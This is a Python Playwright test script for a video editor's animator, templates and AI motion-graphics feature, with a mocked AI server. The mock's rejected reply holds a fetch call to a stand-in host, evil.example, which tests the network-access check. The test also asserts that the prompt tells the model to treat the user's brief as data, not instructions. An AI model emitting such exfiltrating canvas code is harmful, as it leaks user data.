# v78d: the layer animator, the 24 animated templates (audited: every word inside the frame and inside its own card, in
# English, Arabic, German, Japanese, Hindi and Russian, at 16:9, 9:16 and 1:1, at the default spot and pushed into the
# corners, with the default words and with long ones), the templates' words in the viewer's language (shared interface
# translations), AI motion graphics (server route with a mocked text AI: checks, one retry, refund; the code runs and is
# recorded in a sandboxed iframe; a runaway loop stops instead of freezing the page) and the agents putting a storyboard
# together in the editor with animated titles, captions, names and an end card.
import asyncio, base64, hashlib, json, os, subprocess, sys, tempfile, time, urllib.request
from playwright.async_api import async_playwright
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__))); PORT, LPORT = 8066, 8067
D = tempfile.mkdtemp(prefix="nooi-motion-"); os.makedirs(D + "/data"); os.makedirs(D + "/media"); os.symlink(ROOT + "/public", D + "/public"); os.symlink(ROOT + "/node_modules", D + "/node_modules")
SHOTS = os.environ.get("SHOTS_DIR") or tempfile.mkdtemp(prefix="nooi-motion-shots-")
FF = os.environ.get("FFMPEG_PATH", "ffmpeg")
for i, col in enumerate(["0x3060a0", "0xa06030", "0x30a060"]):
    subprocess.run([FF, "-v", "error", "-y", "-f", "lavfi", "-i", f"color=c={col}:s=640x360", "-frames:v", "1", f"{D}/media/sb{i}.png"], check=True)
TOKEN = "nooi_" + "m" * 32   # a paying client (not staff) for the credit checks
json.dump({"users": {"local": {"plan": "studio", "credits": 500, "ledger": [], "posts": {}, "accounts": {}, "jobs": {}},
  "u2": {"plan": "pro", "credits": 5, "ledger": [], "posts": {}, "accounts": {}, "jobs": {}, "tokens": [{"id": "tk1", "name": "test", "hash": hashlib.sha256(TOKEN.encode()).hexdigest(), "last4": TOKEN[-4:], "created": 1}]}}}, open(D + "/data/db.json", "w"))
GOOD = 'function draw(ctx,t,W,H){ctx.fillStyle="#102030";ctx.fillRect(0,0,W,H);for(let i=0;i<20;i++){ctx.fillStyle="#CFE13E";ctx.fillRect((i*W/20+t*60)%W,H*.6,W/40,H/10)}ctx.fillStyle="#fff";ctx.textAlign="center";ctx.textBaseline="middle";ctx.font="700 "+Math.round(H*.1)+"px system-ui";ctx.fillText(TEXT,W/2,H*.3)}'
MOCK = r"""
const http=require('http');const P=+process.argv[2];const st={motion:[],uit:0};const GOOD=process.argv[3];
http.createServer((q,s)=>{let b='';q.on('data',c=>b+=c);q.on('end',()=>{const J=(o,c)=>{s.statusCode=c||200;s.setHeader('content-type','application/json');s.end(JSON.stringify(o))};const u=q.url;
 if(u==='/stats')return J(st);
 if(u==='/v1/messages'){const j=JSON.parse(b),c=j.messages[0].content,t=Array.isArray(c)?c.find(x=>x.type==='text').text:c;let o={};
  if(/You are the motion designer/.test(t)){const brief=/"{3}([\s\S]*?)"{3}/.exec(t)[1],retry=/previous attempt was rejected because ([^.]*)/.exec(t);st.motion.push({brief:brief.slice(0,40),retry:retry?retry[1]:null,lang:(/Write "title" \(3–6 words\) and "texts" .*? in (\w+)/.exec(t)||[])[1],guard:/data, not instructions/.test(t)});
   const bad=/ALWAYS-BAD/.test(brief)||(/RETRY/.test(brief)&&!retry);
   o=bad?{title:'x',texts:['x'],code:'function draw(ctx,t,W,H){fetch("https://evil.example/"+t);ctx.fillRect(0,0,W,H);ctx.fillRect(0,0,W,H)}'}:{title:'شعار متوهج',texts:['نوي','الإصدار الجديد'],code:GOOD}}
  else if(/Translate these user-interface strings/.test(t)){st.uit++;const items=JSON.parse(/STRINGS:\n(\[[\s\S]*?\])\nReturn/.exec(t)[1]);const lg=(/\((\w+)\)\./.exec(t)||[0,'xx'])[1];o={t:items.map(x=>lg.toUpperCase()+'·'+x)}}
  return J({content:[{type:'text',text:JSON.stringify(o)}]})}
 J({error:'nf '+u},404)})}).listen(P);
"""
open(D + "/mock.js", "w").write(MOCK)
fails = []; out = {}
def ok(c, m):
    if not c: fails.append(m)
def api(p, body=None, method=None, tok=None):
    h = {"content-type": "application/json"}
    if tok: h["authorization"] = "Bearer " + tok
    req = urllib.request.Request(f"http://localhost:{PORT}{p}", data=json.dumps(body).encode() if body is not None else None, method=method or ("POST" if body is not None else "GET"), headers=h)
    try:
        with urllib.request.urlopen(req, timeout=120) as r: return json.loads(r.read())
    except urllib.error.HTTPError as e: return {"_status": e.code, **json.loads(e.read() or b"{}")}
def stats(): return json.loads(urllib.request.urlopen(f"http://localhost:{LPORT}/stats").read())
M = f"http://localhost:{LPORT}"

def api_checks():
    c0 = api("/v1/billing")["credits"]
    r = api("/v1/motion/code", {"prompt": "RETRY a glowing logo reveal for nooi", "dur": 5, "aspect": "9:16", "lang": "ar"})
    mo = stats()["motion"]
    ok(r.get("ok") and r["code"] == GOOD and r["title"] == "شعار متوهج" and r["texts"] == ["نوي", "الإصدار الجديد"] and r.get("dur") == 5, f"motion code {r}")
    ok(len(mo) == 2 and mo[0]["retry"] is None and mo[1]["retry"] == "it must not use network access" and mo[1]["lang"] == "Arabic" and mo[1]["guard"], f"one retry with the reason, Arabic words, brief is data {mo}")
    c1 = api("/v1/billing")["credits"]; ok(c0 - c1 == r.get("cost"), f"charged what it says {c0}→{c1} cost {r.get('cost')}")
    b = api("/v1/motion/code", {"prompt": "ALWAYS-BAD please", "dur": 8})
    c2 = api("/v1/billing"); ok(b.get("_status") == 422 and "network access" in b.get("error", "") and c2["credits"] == c1, f"rejected twice → 422 + refund {b} {c1}→{c2['credits']}")
    if r.get("cost"): ok(any(x["reason"].startswith("Refund · AI motion graphic") for x in c2["ledger"]), "refund in the ledger")
    ok(api("/v1/motion/code", {"prompt": "  "}).get("_status") == 400, "empty brief refused")
    # a paying client: 2 credits for a motion graphic, given back when the AI can't make a safe one
    p0 = api("/v1/billing", tok=TOKEN)["credits"]; x = api("/v1/motion/code", {"prompt": "a glowing logo", "dur": 5}, tok=TOKEN); p1 = api("/v1/billing", tok=TOKEN)
    ok(x.get("ok") and x.get("cost") == 2 and p0 - p1["credits"] == 2, f"client pays 2 credits {p0}→{p1['credits']} {x.get('cost')}")
    y = api("/v1/motion/code", {"prompt": "ALWAYS-BAD for a client"}, tok=TOKEN); p2 = api("/v1/billing", tok=TOKEN)
    ok(y.get("_status") == 422 and p2["credits"] == p1["credits"] and any(l["reason"].startswith("Refund · AI motion graphic") for l in p2["ledger"]), f"client refunded {y} {p1['credits']}→{p2['credits']}")
    api("/v1/admin/users/u2", {"creditsDelta": -p2["credits"]}, "PATCH"); z = api("/v1/motion/code", {"prompt": "a glowing logo"}, tok=TOKEN)
    ok(z.get("_status") == 402, f"no credits → 402 {z}")
    out["motionApi"] = {"cost": r.get("cost"), "calls": len(stats()["motion"])}

# long words for every template, per language (used to prove the words always fit)
LONG = {
 "en": ["Grand opening of our brand-new flagship store downtown", "Every Friday and Saturday from 8 PM until midnight — everyone is welcome", ["Free delivery across the whole country", "Award-winning customer support team", "Thirty-day money-back guarantee", "Secure payments with every card", "Loyalty points on every single order"], "Dr. Alexandra Montgomery-Fitzgerald", "Chief Executive Officer and Co-founder"],
 "ar": ["الافتتاح الكبير لمتجرنا الرئيسي الجديد في وسط المدينة", "كل جمعة وسبت من الثامنة مساءً حتى منتصف الليل — الجميع مرحب بهم", ["توصيل مجاني إلى جميع مدن المملكة", "فريق دعم عملاء حائز على جوائز", "ضمان استرداد الأموال لمدة ثلاثين يوماً", "مدفوعات آمنة بجميع البطاقات", "نقاط ولاء على كل طلب"], "الدكتورة ألكسندرا مونتغمري فيتزجيرالد", "الرئيسة التنفيذية والمؤسسة المشاركة"],
 "de": ["Große Eröffnung unseres brandneuen Flaggschiff-Geschäfts in der Innenstadt", "Jeden Freitag und Samstag von 20 Uhr bis Mitternacht — alle sind herzlich willkommen", ["Kostenlose Lieferung im ganzen Land", "Preisgekröntes Kundenservice-Team", "Dreißig Tage Geld-zurück-Garantie", "Sichere Zahlungen mit jeder Karte", "Treuepunkte bei jeder einzelnen Bestellung"], "Dr. Alexandra Montgomery-Fitzgerald", "Geschäftsführerin und Mitgründerin"],
 "ja": ["ダウンタウンに新しい旗艦店がグランドオープンします", "毎週金曜日と土曜日の午後8時から深夜まで、どなたでも大歓迎です", ["全国どこでも送料無料でお届けします", "受賞歴のあるカスタマーサポート", "30日間の返金保証付き", "すべてのカードで安全なお支払い", "ご注文ごとにポイントが貯まります"], "モンゴメリー・フィッツジェラルド博士", "最高経営責任者兼共同創業者"],
 "hi": ["शहर के बीचों-बीच हमारे बिल्कुल नए फ्लैगशिप स्टोर का भव्य उद्घाटन", "हर शुक्रवार और शनिवार रात 8 बजे से आधी रात तक — सभी का स्वागत है", ["पूरे देश में मुफ़्त डिलीवरी", "पुरस्कार विजेता ग्राहक सहायता टीम", "तीस दिन की मनी-बैक गारंटी", "हर कार्ड से सुरक्षित भुगतान", "हर ऑर्डर पर लॉयल्टी पॉइंट्स"], "डॉ. अलेक्ज़ांड्रा मोंटगोमरी-फिट्ज़गेराल्ड", "मुख्य कार्यकारी अधिकारी और सह-संस्थापक"],
 "ru": ["Торжественное открытие нашего нового флагманского магазина в центре города", "Каждую пятницу и субботу с 20:00 до полуночи — ждём всех", ["Бесплатная доставка по всей стране", "Отмеченная наградами служба поддержки", "Тридцатидневная гарантия возврата денег", "Безопасные платежи любой картой", "Бонусные баллы за каждый заказ"], "Д-р Александра Монтгомери-Фицджеральд", "Генеральный директор и соучредитель"],
}
AUDIT = r"""async (A)=>{const [LONG,shots]=A;const types=INFO_T.map(x=>x[0]),bad=[],sheets={};let checked=0;icWarm();await new Promise(r=>setTimeout(r,400));
 const longFor=(type,l)=>{const [s,ln,it,nm,ro]=LONG[l],j=x=>x.join(" | ");return({lower3:{t1:nm,t2:ro},title:{t1:s,t2:ln},counter:{t1:s,t2:"+",val:"1250000"},progress:{t1:s,val:"75"},bars:{t1:s,t2:it.map((x,i)=>x.split(/\s+/)[0]+":"+(20+i*15)).join(", ")},donut:{t1:s,val:"62"},
  stat:{t1:"98%",t2:ln},list:{t1:s,t2:j(it)},steps:{t1:s,t2:j(it)},callout:{t1:it[0]},arrow:{t1:it[1]},follow:{t1:"@nooi.ai.official.channel",t2:ln},kinetic:{t1:s+" "+it[0],t2:ro},quote:{t1:ln+" "+s+" "+it[1],t2:nm},countdown:{t1:it[3],val:"3"},
  timeline:{t1:s,t2:["2019","2021","2023","2025","2026"].map((y,i)=>y+": "+it[i]).join(" | ")},compare:{t1:it[0],t2:it[1],val:"VS"},price:{t1:s,t2:"1,299.99 SAR | 1,899.99 SAR"},cta:{t1:it[4],t2:ln},social:{t1:"@nooi.ai.official.channel",t2:ln+" "+s+" "+it.join(", "),val:"128000"},
  pin:{t1:nm,t2:ln},rating:{t1:s,val:"4.8"},iconrow:{t1:s,t2:["spark","shield","wallet","users"].map((k,i)=>k+":"+it[i]).join(" | ")},endcard:{t1:s,t2:ln}})[type]};
 // every text drawn: its box on the canvas (transform, alignment, direction), with the alpha it was drawn at
 const boxOf=(ctx,s,x,y)=>{const m=ctx.measureText(s),w=m.width,al=ctx.textAlign,rtl=ctx.direction==="rtl";let x0=al==="center"?x-w/2:(al==="left"||(al==="start"&&!rtl)||(al==="end"&&rtl))?x:x-w;
  const asc=m.actualBoundingBoxAscent||0,des=m.actualBoundingBoxDescent||0,T=ctx.getTransform(),P=[[x0,y-asc],[x0+w,y-asc],[x0,y+des],[x0+w,y+des]].map(([a,b])=>[T.a*a+T.c*b+T.e,T.b*a+T.d*b+T.f]);
  return{x0:Math.min(...P.map(p=>p[0])),x1:Math.max(...P.map(p=>p[0])),y0:Math.min(...P.map(p=>p[1])),y1:Math.max(...P.map(p=>p[1])),a:ctx.globalAlpha,s:String(s).slice(0,24)}};
 const SZ={"16:9":[1280,720],"9:16":[720,1280],"1:1":[1080,1080]};
 for(const l of Object.keys(LONG))for(const asp of Object.keys(SZ)){const [W,H]=SZ[asp],cv=document.createElement("canvas");cv.width=W;cv.height=H;const ctx=cv.getContext("2d");
  const sheet=shots.includes(l+"|"+asp)?document.createElement("canvas"):null,cols=6,cw=W/3,chh=H/3;if(sheet){sheet.width=cw*cols;sheet.height=chh*Math.ceil(types.length*2/cols)}
  let cell=0;
  for(const type of types){S.lang=l;S.ed.infos=[];ED.t=0;const it=edAddInfo(type);const base={t1:it.t1,t2:it.t2,val:it.val,x:it.x,y:it.y};
   for(const variant of ["default","long"]){Object.assign(it,base,variant==="long"?longFor(type,l):{});
    for(const pos of [[base.x,base.y],[.985,.985],[.015,.015],[.985,.015],[.015,.985]]){it.x=pos[0];it.y=pos[1];
     for(const tt of [2.6,type==="countdown"?3.55:null].filter(Boolean)){const rec=[],ft=ctx.fillText;ctx.fillText=function(s,x,y){if(String(s).trim())rec.push(boxOf(ctx,s,x,y));return ft.apply(this,arguments)};
      ED.hit=[];ctx.setTransform(1,0,0,1,0,0);ctx.fillStyle="#333";ctx.fillRect(0,0,W,H);try{edInfoDraw(ctx,W,H,it.start+tt)}catch(e){bad.push([l,asp,type,variant,pos.join(","),"crash "+e.message])}ctx.fillText=ft;checked++;
      const hb=(ED.hit||[]).find(h=>h.k==="info"),U=Math.min(W,H),tol=2;
      if(!rec.length)bad.push([l,asp,type,variant,pos.join(","),"no text drawn"]);
      for(const b of rec){if(b.a<.5)continue;
       if(b.x0<-tol||b.y0<-tol||b.x1>W+tol||b.y1>H+tol)bad.push([l,asp,type,variant,pos.join(","),"outside the frame",b.s,Math.round(b.x0),Math.round(b.y0),Math.round(b.x1),Math.round(b.y1)]);
       else if(hb&&!["callout","arrow"].includes(type)){const m=U*.03;if(b.x0<hb.x-m||b.x1>hb.x+hb.w+m||b.y0<hb.y-m||b.y1>hb.y+hb.h+m)bad.push([l,asp,type,variant,pos.join(","),"outside its card",b.s,Math.round(b.x0-hb.x),Math.round(b.y0-hb.y),Math.round(hb.x+hb.w-b.x1),Math.round(hb.y+hb.h-b.y1)])}}
      if(hb&&(hb.x<-tol||hb.y<-tol||hb.x+hb.w>W+tol||hb.y+hb.h>H+tol))bad.push([l,asp,type,variant,pos.join(","),"card outside the frame",Math.round(hb.x),Math.round(hb.y),Math.round(hb.w),Math.round(hb.h)]);
      if(sheet&&pos[0]===base.x&&pos[1]===base.y&&tt===2.6){const sc=sheet.getContext("2d");sc.drawImage(cv,(cell%cols)*cw,Math.floor(cell/cols)*chh,cw,chh);sc.fillStyle="#CFE13E";sc.font="600 14px sans-serif";sc.fillText(type+" · "+variant,(cell%cols)*cw+6,Math.floor(cell/cols)*chh+16);cell++}}}}}
  if(sheet)sheets[l+"_"+asp.replace(":","x")]=sheet.toDataURL("image/png")}
 S.lang="en";S.ed.infos=[];return{checked,bad:bad.slice(0,60),nbad:bad.length,sheets}}"""

async def ui(p, w):
    mob = w < 800; tag = "phone" if mob else "desktop"; r = {}
    b = await p.chromium.launch(); ctx = await b.new_context(viewport={"width": w, "height": 900}, is_mobile=mob, has_touch=mob)
    pg = await ctx.new_page(); errs = []; pg.on("pageerror", lambda e: errs.append(str(e)[:300]))
    await pg.goto(f"http://localhost:{PORT}/"); await pg.wait_for_timeout(1500); E = pg.evaluate
    async def wait_for(js, sec=30):
        for _ in range(sec * 4):
            if await E(js): return True
            await asyncio.sleep(.25)
        return False
    lang = "ar" if mob else "en"
    await E("()=>{window.__t=[];const t0=toast;toast=function(m,o){window.__t.push(String(m));return t0.apply(this,arguments)};S.langAsked=true;document.getElementById('langsug')?.remove();S.lang='%s';S.user={name:'T',method:'google'};AU.showAuth=false;"
            "PJ.fresh('edit');S.cur.edit=null;edxInit();S.ed.sfx=[];S.ed.clips.push({id:uid(),src:{k:'demo',kind:'scene',seed:11},in:0,out:8,speed:1,trans:'cut',vol:100});S.ed.sel=S.ed.clips[0].id;ED.playing=false;ED.t=0;go('edit');renderAll()}" % lang)
    if not mob:
        a = await E("A=>(" + AUDIT + ")(A)", [LONG, ["en|16:9", "ar|9:16", "ja|1:1", "hi|16:9"]])
        r["templates"] = {"checked": a["checked"], "problems": a["nbad"], "first": a["bad"][:25]}
        ok(a["checked"] >= 24 * 2 * 5 * 3 * 6 and a["nbad"] == 0, f"{tag}: templates fit ({a['checked']} renders) — {a['nbad']} problems: {a['bad'][:25]}")
        for k, v in a["sheets"].items():
            open(f"{SHOTS}/templates_{k}.png", "wb").write(base64.b64decode(v.split(",", 1)[1]))
        r["shots"] = SHOTS
    # ---- the animator on a text layer
    await E("()=>{S.ed.tab='text';renderView();document.querySelector('[data-act=ed-addtext]').click()}"); await pg.wait_for_timeout(200)
    r["panel"] = await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText);return [!!tx,!!document.querySelector('.edsel.la'),document.querySelectorAll('.edsel.la [data-act=la-set]').length]}")
    ok(r["panel"][0] and r["panel"][1] and r["panel"][2] == len(["none"]) * 0 + 10 + 6 + 8, f"{tag}: Motion panel on a text layer {r['panel']}")
    for f, v in (("ap", "flyL"), ("lp", "pulse"), ("xp", "zoom")):
        await pg.click(f".edsel.la [data-act=la-set][data-f={f}][data-v={v}]"); await pg.wait_for_timeout(120)
    r["presets"] = await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText);return [tx.ap,tx.lp,tx.xp,document.querySelector('.edsel.la [data-f=ap][data-v=flyL]').getAttribute('aria-pressed')]}")
    ok(r["presets"] == ["flyL", "pulse", "zoom", "true"], f"{tag}: presets set {r['presets']}")
    # where the text is drawn over time (fly in from the left, pulse, shrink out), its rotation and opacity
    DRAW = "(tx,t)=>{const cv=document.createElement('canvas');cv.width=1280;cv.height=720;const c=cv.getContext('2d'),GA=Object.getOwnPropertyDescriptor(CanvasRenderingContext2D.prototype,'globalAlpha');let o=null;const ft=c.fillText;c.fillText=function(s,x,y){const T=c.getTransform();if(!o)o={x:T.a*x+T.c*y+T.e,rot:Math.atan2(T.b,T.a)*180/Math.PI,a:GA.get.call(c),px:+(/(\\d+(?:\\.\\d+)?)px/.exec(c.font)||[0,0])[1]*Math.hypot(T.a,T.b)};return ft.apply(this,arguments)};drawTextLayer(c,tx,1280,720,t);return o}"
    r["fly"] = await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText),D=" + DRAW + ";tx.start=0;tx.end=4;return [D(tx,.05),D(tx,1.5),D(tx,3.9)]}")
    f0, f1, f2 = r["fly"]
    ok(f0 and f1 and f2 and f0["x"] < f1["x"] - 200 and f0["a"] < .5 and f1["a"] > .95 and f2["px"] < f1["px"] * .5 and f2["a"] < .5, f"{tag}: fly in from the left, shrink out {r['fly']}")
    await E("()=>{const i=document.querySelector('[data-la=rot]');i.value='30';i.dispatchEvent(new Event('input',{bubbles:true}));const o=document.querySelector('[data-la=op]');o.value='50';o.dispatchEvent(new Event('input',{bubbles:true}))}")
    r["rotop"] = await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText),D=" + DRAW + ";const d=D(tx,1.5);return [tx.rot,tx.op,Math.round(d.rot),+d.a.toFixed(2),document.querySelector('#larot').textContent,document.querySelector('#laop').textContent]}")
    ok(r["rotop"][0] == 30 and r["rotop"][1] == .5 and abs(r["rotop"][2] - 30) <= 3 and abs(r["rotop"][3] - .5) < .08 and r["rotop"][4] == "30°" and r["rotop"][5] == "50%", f"{tag}: rotation & opacity {r['rotop']}")
    # keyframes: a key at the playhead, drag at a later time makes a second key, the move is interpolated between them
    await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText);Object.assign(tx,{ap:'none',lp:'none',xp:'none',rot:0,op:1,x:.3,y:.5});ED.t=.5;renderView()}")
    await pg.click(".edsel.la [data-act=la-key]"); await pg.wait_for_timeout(150)
    r["kf1"] = await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText);return (tx.kf||[]).map(f=>[f.t,f.x])}")
    await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText),D=" + DRAW + ";ED.t=3;D(tx,3);tx.x=.8;D(tx,3)}")
    r["kf2"] = await E("()=>{const tx=S.ed.texts.find(x=>x.id===S.ed.selText),D=" + DRAW + ";return [(tx.kf||[]).map(f=>[f.t,+f.x.toFixed(2)]),Math.round(D(tx,1.75).x),Math.round(D(tx,.2).x),Math.round(D(tx,3.5).x)]}")
    ok(r["kf1"] == [[.5, .3]] and r["kf2"][0] == [[.5, .3], [3, .8]] and 384 + 100 < r["kf2"][1] < 1024 - 100 and abs(r["kf2"][2] - 384) < 4 and abs(r["kf2"][3] - 1024) < 4, f"{tag}: keyframes {r['kf1']} {r['kf2']}")
    await E("()=>renderView()"); r["chips"] = await E("()=>document.querySelectorAll('.lakf span').length")
    await pg.click(".lakf [data-act=la-go][data-i='1']"); await pg.wait_for_timeout(100)
    r["go"] = await E("()=>+ED.t.toFixed(2)"); await pg.click(".lakf [data-act=la-delk][data-i='0']"); await pg.wait_for_timeout(100)
    r["del"] = await E("()=>S.ed.texts.find(x=>x.id===S.ed.selText).kf.length"); await pg.click(".edsel.la [data-act=la-clear]"); await pg.wait_for_timeout(100)
    r["clear"] = await E("()=>S.ed.texts.find(x=>x.id===S.ed.selText).kf.length")
    ok(r["chips"] == 2 and r["go"] == 3 and r["del"] == 1 and r["clear"] == 0, f"{tag}: key chips go/delete/clear {r['chips']} {r['go']} {r['del']} {r['clear']}")
    # ---- the animator on an infographic + the new template fields
    await E("()=>{S.ed.tab='info';ED.t=0;renderView()}")
    await pg.click(".edpanel71 [data-act=edi-add][data-v=price]"); await pg.wait_for_timeout(200)
    r["info"] = await E("()=>{const it=edItem(edPick());return [it&&it.type,!!document.querySelector('.edsel.la'),!!document.querySelector('[data-ib=t2]'),!!document.querySelector('.mgbox'),document.querySelectorAll('.edpanel71 [data-act=edi-add]').length]}")
    ok(r["info"][0] == "price" and r["info"][1] and r["info"][2] and r["info"][3] and r["info"][4] == 24, f"{tag}: infographic Motion panel, fields, AI motion box, 24 templates {r['info']}")
    await pg.click(".edsel.la [data-act=la-set][data-f=ap][data-v=flyR]"); await pg.wait_for_timeout(100)
    r["infofly"] = await E("()=>{const it=edItem(edPick());const cv=document.createElement('canvas');cv.width=1280;cv.height=720;const c=cv.getContext('2d');const at=t=>{ED.hit=[];edInfoDraw(c,1280,720,it.start+t);const h=ED.hit.find(x=>x.id===it.id);return h&&Math.round(h.x)};return [it.ap,at(.05),at(2)]}")
    ok(r["infofly"][0] == "flyR" and r["infofly"][1] is not None and r["infofly"][1] > r["infofly"][2] + 200, f"{tag}: infographic flies in from the right {r['infofly']}")
    # ---- AI motion graphics: a ready one, then the AI one, then a runaway loop
    await E("()=>{S.ed.tab='info';renderView()}")
    await pg.click(".mgbox [data-act=mg-dur][data-v='5']"); await pg.wait_for_timeout(100)
    n0 = await E("()=>S.ed.clips.length")
    await pg.click(".mgbox [data-act=mg-pre][data-v=neon]")
    ok(await wait_for("()=>S.jobs.some(j=>j.meta&&j.meta.motion)&&!MGX.busy", 40), f"{tag}: ready motion graphic recorded " + str(await E("()=>window.__t.slice(-2)")))
    r["mg"] = await E("()=>{const j=S.jobs.filter(j=>j.meta&&j.meta.motion).pop();return [j.dur,j.kind,S.ed.clips.length,S.ed.clips.some(c=>c.src&&c.src.job===j.id),!!document.querySelector('.mgrun')]}")
    ok(r["mg"][0] == 5 and r["mg"][1] == "video" and r["mg"][2] == n0 + 1 and r["mg"][3] and not r["mg"][4], f"{tag}: motion graphic on the timeline {r['mg']}")
    r["mgsize"] = await E("async()=>{const j=S.jobs.filter(j=>j.meta&&j.meta.motion).pop();const b=await (await fetch(mediaUrl(j))).blob();return [b.size,b.type]}")
    ok(r["mgsize"][0] > 5000, f"{tag}: recording has frames {r['mgsize']}")
    await E("()=>{S.ed.tab='info';renderView();document.querySelector('#mgp').value='RETRY a glowing logo';}")
    await pg.click(".mgbox [data-act=mg-ai]")
    ok(await wait_for("()=>S.jobs.filter(j=>j.meta&&j.meta.motion).length===2&&!MGX.busy", 60), f"{tag}: AI motion graphic recorded " + str(await E("()=>window.__t.slice(-2)")))
    r["mgai"] = await E("()=>{const j=S.jobs.filter(j=>j.meta&&j.meta.motion).pop();return [j.title,/\\/media\\/[\\w-]+\\.webm$/.test(j.resultUrl)]}")
    ok(r["mgai"][0] == "شعار متوهج" and r["mgai"][1], f"{tag}: AI motion graphic title + uploaded {r['mgai']}")
    r["loop"] = await E("async()=>{const t0=performance.now();try{await mgRun('function draw(ctx,t,W,H){let i=0;while(true){i++}}',2,160,90,'x');return ['no error']}catch(e){return [String(e.message),Math.round(performance.now()-t0)]}}")
    ok("loops too long" in r["loop"][0] and r["loop"][1] < 8000, f"{tag}: a runaway loop stops {r['loop']}")
    r["guard"] = await E("()=>{const g=mgGuard('function draw(ctx,t,W,H){for(let i=0;i<3;i++){}for(const a of [1]){}do{}while(false);const s=\"for(;;)\";}');return [g.includes('__g()&&(i<3)'),g.includes('for(const a of [1])'),g.includes('while(__g()&&(false))'),g.includes('\"for(;;)\"')]}")
    ok(r["guard"] == [True, True, True, True], f"{tag}: loop guard rewrites loops only {r['guard']}")
    r["presets"] = await E("""()=>{const bad=[];for(const p of MG_PRESETS)for(const [W,H] of [[640,360],[360,640]])for(const T of ['Grand opening of our flagship store','الافتتاح الكبير لمتجرنا']){try{const draw=new Function('TEXT',mgGuard(p[3])+';return draw')(T);const c=document.createElement('canvas');c.width=W;c.height=H;const x=c.getContext('2d');for(const t of [0,.7,1.6,3,5])draw(x,t,W,H)}catch(e){bad.push(p[0]+':'+e.message)}}return [MG_PRESETS.length,bad]}""")
    ok(r["presets"][0] == 6 and not r["presets"][1], f"{tag}: every ready motion graphic draws in EN/AR, 16:9 and 9:16 {r['presets']}")
    await E("()=>{S.ed.tab='info';S.story.title='Desert Rally';renderView()}")
    r["ideas"] = await E("()=>document.querySelectorAll('.mgbox [data-act=mg-idea]').length")
    await pg.click(".mgbox [data-act=mg-idea][data-v=explain]"); await pg.wait_for_timeout(150)
    r["idea"] = await E("()=>[document.querySelector('#mgp').value.includes('Desert Rally'),MGX.dur,[...document.querySelectorAll('.mgbox [data-act=mg-dur]')].some(b=>b.dataset.v==='20'&&b.getAttribute('aria-pressed')==='true')]")
    ok(r["ideas"] == 12 and r["idea"] == [True, 20, True], f"{tag}: 12 ideas, a brief with your title and length {r['ideas']} {r['idea']}")
    # ---- the agents put a storyboard together in the editor
    await E("""()=>{S.story.title='The Lost Kite';S.chars=S.chars.length?S.chars:[{id:'k1',name:'Lina',gender:'female',persona:'Brave'}];const ch=S.chars[0];
      ['a','b','c'].forEach((k,i)=>S.jobs.push({id:'sbj'+k,kind:'image',status:'complete',progress:1,created:Date.now(),title:'scene '+k,prompt:'scene',resultUrl:'/media/sb'+i+'.png',aspect:'16:9',seed:i,pal:PALS[0],art:'scene'}));
      S.board.frames=[{id:'f1',shot:'ews',camera:'aerial',transition:'fade',dur:3,action:'City',dialogue:'',speaker:'narrator',job:'sbja'},{id:'f2',shot:'ms',camera:'static',transition:'cut',dur:3,action:'Run',dialogue:'Wait for me!',speaker:ch.id,job:'sbjb'},{id:'f3',shot:'cu',camera:'static',transition:'cut',dur:3,action:'Kite',dialogue:'Got you.',speaker:ch.id,job:'sbjc'}];
      PJ.fresh('edit');S.cur.edit=null;edxInit();S.ed.infos=[];S.ed.texts=[];go('board');renderAll()}""")
    ok(await wait_for("()=>!!document.querySelector('[data-act=agsb-edit]')", 10), f"{tag}: Put it together button on the storyboard")
    await E("()=>document.querySelector('[data-act=agsb-edit]').click()")
    ok(await wait_for("()=>S.view==='edit'&&S.ed.clips.length===3", 20), f"{tag}: storyboard in the editor " + str(await E("()=>[S.view,S.ed.clips.length,window.__t.slice(-2)]")))
    r["asm"] = await E("()=>{const I=S.ed.infos||[];return [I.map(x=>x.type).join(','),I.find(x=>x.type==='kinetic').ap,I.find(x=>x.type==='endcard').lp,S.ed.texts.length,S.ed.texts.every(t=>t.ap==='fade'&&t.xp==='fade'),I.find(x=>x.type==='lower3')&&I.find(x=>x.type==='lower3').t1,Math.round(edTotal())]}")
    ok(r["asm"][0] == "kinetic,lower3,endcard" and r["asm"][1] == "zoom" and r["asm"][2] == "pulse" and r["asm"][3] == 2 and r["asm"][4] and r["asm"][5] and r["asm"][6] == 9, f"{tag}: animated title, name, captions, end card {r['asm']}")
    # ---- template words in another language (shared interface translations)
    if not mob:
        await E("()=>{S.lang='de';S.ed.infos=[];ED.t=0;window.__de=[edAddInfo('title'),edAddInfo('iconrow'),edAddInfo('bars')]}")
        ok(await wait_for("()=>window.__de[0].t1.startsWith('DE·')&&window.__de[1].t2.includes('DE·')", 20), "German template words " + str(await E("()=>window.__de.map(x=>[x.t1,x.t2])")))
        r["de"] = await E("()=>window.__de.map(x=>[x.t1,x.t2])")
        ok(r["de"][0] == ["DE·Grand opening", "DE·This Friday · 8 PM"] and r["de"][1][1].startswith("spark: DE·Fast | shield: DE·Safe | wallet: DE·Fair price | users: ") and r["de"][2][1] == "Q1:30, Q2:55, Q3:70, Q4:90", f"structure kept, words translated {r['de']}")
        await E("()=>{S.lang='en';renderAll()}")
    # ---- layout: nothing wider than the screen with the new panels open
    await E("()=>{S.ed.tab='info';const it=(S.ed.infos||[])[0];if(it)edSetPick('info',it.id);renderView()}"); await pg.wait_for_timeout(200)
    r["overflow"] = await E("()=>[document.documentElement.scrollWidth,innerWidth,!!document.querySelector('.edsel.la'),!!document.querySelector('.mgbox')]")
    ok(r["overflow"][0] <= r["overflow"][1] and r["overflow"][2] and r["overflow"][3], f"{tag}: no sideways scroll with the Motion panels {r['overflow']}")
    ok(not errs, f"{tag}: page errors {errs}")
    await b.close(); return r

async def main():
    async with async_playwright() as p:
        for w in (1280, 390): out[w] = await ui(p, w)

if __name__ == "__main__":
    mk = subprocess.Popen(["node", D + "/mock.js", str(LPORT), GOOD], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
